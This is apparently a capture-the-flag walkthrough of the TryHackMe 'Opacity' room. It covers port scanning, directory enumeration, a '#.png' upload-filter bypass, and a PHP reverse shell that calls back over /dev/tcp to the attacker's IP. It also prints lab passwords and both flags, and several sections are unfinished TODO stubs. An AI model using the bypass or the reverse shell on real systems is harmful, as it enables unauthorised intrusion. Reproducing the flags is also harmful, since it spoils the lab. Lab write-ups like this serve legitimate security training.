---
title: THM - Walkthrough - Opacity [Easy]
date: 2024-07-28 00:00:00 +/-TTTT
categories: [Walkthrough]
tags: [ctf, thm, easy]     # TAG names should always be lowercase
---

The room is available [here](https://tryhackme.com/room/opacity).

## Information Gathering

### Port Scanning

We start by using `nmap` to scan the target machine for open ports and services.

```
$ nmap -sV 10.10.86.31
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 12:38 EDT
Nmap scan report for 10.10.86.31
Host is up (0.22s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.07 seconds
```

We see that the target machine has the following services running:
- `SSH` on port 22
- `HTTP` on port 80
- `Samba` on ports 139 and 445

### Website Enumeration

Visiting the website at `http://10.10.86.31` we are redirected on `http://10.10.86.31/login.php` which is a login page.

![Login Page](assets/img/posts/walkthroughs/opacity/20240728_opacity_login_page.png)

#### Directory Enumeration

We use `gobuster` to find hidden directories on the website.

```
$ gobuster dir -u http://10.10.86.31/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster_dir_output.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.86.31/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 308] [--> http://10.10.86.31/css/]
/cloud                (Status: 301) [Size: 310] [--> http://10.10.86.31/cloud/]
...
```

We find a directory `/cloud` containing a index page.

![Cloud Directory](assets/img/posts/walkthroughs/opacity/20240728_opacity_cloud.png)

## Exploitation

### File Upload

We seems to have a file upload form on the page. We try to upload a PHP file by creating a simple HTTP server with Python (`$ python -m http.server 1234`) and a simple PHP file.

```php
<?php
phpinfo();
?>
```

Then we provide the URL of the PHP file to the upload form.

`http://10.2.34.126:1234/payload.php`

Unfortunately, the upload is blocked by the server. The server is checking the file extension and only allows images file extensions.

![Upload Blocked](assets/img/posts/walkthroughs/opacity/20240728_opacity_fail_upload.png)

We can bypass this by using a PHP file with a valid image extension and bypassing the filter with a `#`.
The server will only check the extension after the `#` and not interpret it when making the GET request on our server. 

`payload.php#.png`

We provide the new URL to the upload form.

`http://10.2.34.126:1234/payload.php#.png`

![Upload Success](assets/img/posts/walkthroughs/opacity/20240728_opacity_successful_upload.png)

The upload is successful and we can then access the file at `http://10.10.86.31/cloud/images/payload.php`.

![phpinfo Injection](assets/img/posts/walkthroughs/opacity/20240728_opacity_phpinfo.png)

As we can see, the php file is executed and we can now inject PHP code.
(It is possible the server remove the file before you try to access it, you can try to upload it again)

### Reverse Shell

We can now inject a reverse shell in the PHP file after setting up a listener on our machine.

```php
<?php
echo shell_exec("bash -c 'exec bash -i &>/dev/tcp/10.2.34.126/1235 <&1'");
?>
```

Following the same process as before, we upload the file with the `.png` extension and access it at `http://10.10.86.31/cloud/images/payload.php`.

And now we have a reverse shell on the target machine.

### Local Enumeration **TODO**

```php
<?php session_start(); /* Starts the session */

        /* Check Login form submitted */
        if(isset($_POST['Submit'])){
                /* Define username and associated password array */
                $logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');

                ...
        }
?>
```

### Keepass Crack

**TODO**

![Keepass Database](assets/img/posts/walkthroughs/opacity/20240728_opacity_keepass_crack.png)

`dataset:741852963`

`sysadmin:Cl0udP4ss40p4city#8700`

![Local flag](assets/img/posts/walkthroughs/opacity/20240728_opacity_local_flag.png)

`6661b61b44d234d230d06bf5b3c075e2`

## Post-Exploitation

### Privilege Escalation

**TODO**

![Root flag](assets/img/posts/walkthroughs/opacity/20240728_opacity_root_flag.png)

`ac0d56f93202dd57dcb2498c739fd20e`